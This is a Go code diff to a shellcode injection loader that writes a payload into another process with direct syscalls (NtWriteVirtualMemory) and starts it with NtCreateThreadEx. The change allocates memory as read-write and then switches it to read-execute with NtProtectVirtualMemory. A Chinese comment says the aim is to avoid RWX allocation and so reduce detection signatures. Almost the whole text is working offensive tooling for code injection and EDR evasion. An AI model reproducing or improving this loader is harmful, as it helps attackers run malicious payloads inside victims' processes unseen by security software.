@@ -27,6 +27,8 @@ var (
 const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
+	PAGE_READWRITE         = 0x04
+	PAGE_EXECUTE_READ      = 0x20
 	PAGE_EXECUTE_READWRITE = 0x40
 	PROCESS_ALL_ACCESS     = 0x1F0FFF
 )
@@ -82,7 +84,7 @@ func Execute(shellcode []byte) error {
 		0,
 		&regionSize,
 		MEM_COMMIT|MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE,
+		PAGE_READWRITE,
 	)
 
 	if status != 0 {
@@ -104,6 +106,23 @@ func Execute(shellcode []byte) error {
 		return fmt.Errorf("NtWriteVirtualMemory 失败, status: 0x%x", status)
 	}
 	fmt.Printf("[+] Payload 已写入目标进程(Syscall): %d 字节\n", bytesWritten)
+
+	// *. 修改内存权限为 RX (NtProtectVirtualMemory)
+	// 避免直接申请 RWX 内存，减少特征
+	var oldProtect uintptr
+	protectSize := uintptr(len(shellcode))
+	status = sys.NtProtectVirtualMemory(
+		uintptr(hProcess),
+		&baseAddr,
+		&protectSize, // 注意：NtProtectVirtualMemory 可能会修改这个值
+		PAGE_EXECUTE_READ,
+		&oldProtect,
+	)
+
+	if status != 0 {
+		return fmt.Errorf("NtProtectVirtualMemory 失败, status: 0x%x", status)
+	}
+	fmt.Printf("[+] 内存权限已修改为 RX (Syscall)\n")
 
 	// 5. 在目标进程创建远程线程执行 (NtCreateThreadEx)
 	var hThread uintptr
